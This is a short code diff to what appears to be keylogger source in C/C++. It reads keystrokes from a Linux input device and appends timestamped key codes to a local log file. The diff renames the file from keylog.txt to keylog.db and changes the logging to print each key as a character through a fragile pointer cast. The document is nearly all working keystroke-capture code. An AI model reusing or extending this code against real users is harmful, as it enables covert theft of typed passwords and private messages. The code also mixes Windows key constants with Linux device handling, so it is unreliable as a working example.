@@ -48,18 +48,18 @@ bool log(int key_stroke)
       return true;
    }
 
-   FILE* myFile = fopen("keylog.txt", "a+");
+   FILE* myFile = fopen("keylog.db", "a+");
    time_t rawtime;
    time (&rawtime);
 
-   printf("(%lu) %d=%d\n", rawtime, key_stroke, key_stroke);
+   printf("(%lu) %d=%s\n", rawtime, key_stroke, (char*) &key_stroke);
 
    if(key_stroke == VK_ESCAPE)
    {
       return false;
    }else
    {
-      fprintf(myFile,"(%lu) %d=%d\n", rawtime, key_stroke, key_stroke);
+      fprintf(myFile,"(%lu) %d=%s\n", rawtime, key_stroke, (char*) &key_stroke);
       fclose(myFile);
       return true;
    }
@@ -91,7 +91,7 @@ int main() {
 	device_filename = "/dev/input/event2";
 
 	//db_filename = "keylog.db";
-	txt_filename = "keylog.txt";
+	txt_filename = "keylog.db";
 
 	int device_file = open(device_filename.c_str(), O_RDONLY);
 	//keylog_db::KeyDB keydb = keylog_db::KeyDB(db_filename);
